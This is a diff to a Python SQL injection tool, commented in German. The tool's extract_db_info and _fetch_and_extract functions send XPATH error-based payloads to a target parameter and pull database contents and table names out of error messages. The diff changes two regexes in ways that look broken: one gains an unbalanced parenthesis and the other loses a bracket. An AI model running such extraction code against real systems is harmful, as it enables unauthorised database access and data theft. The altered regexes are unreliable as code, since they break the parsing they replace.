@@ -118,7 +118,7 @@ def _fetch_and_extract(target, param, payload, patterns):
                 if val and 1 < len(val) < 500:
                     return val
         # Fallback: Scan nach XPATH Syntax Error
-        xpath_m = re.search(r'XPATH syntax error:\s*[\'"]?([^\'"<\s][^\'"<]{0,200})', body)
+        xpath_m = re.search(r'XPATH syntax error:\s*[\'"]?(([^\'"<\s][^\'"<]{0,200})', body)
         if xpath_m:
             val = xpath_m.group(1).strip('~').strip()
             if val and len(val) > 1:
@@ -172,7 +172,7 @@ def extract_db_info(target, param, db_type='mysql'):
     # Versuche XPATH Error-based Extraktion
     db_xpath = xpath_payloads.get(db_type, xpath_payloads['mysql'])
     for label, payload in db_xpath.items():
-        val = _fetch_and_extract(target, param, payload, [r'~([^~]+)~', r'XPATH syntax error:\s*[\'"]?([^\'"<\s][^\'"<]{0,200})'])
+        val = _fetch_and_extract(target, param, payload, [r'~([^~]+)~', r'XPATH syntax error:\s*[\'"]?(^\'"<\s][^\'"<]{0,200})'])
         if val and f"xpath:{label}:{val[:50]}" not in seen:
             seen.add(f"xpath:{label}:{val[:50]}")
             if label == 'Tabellen' and ',' in val:
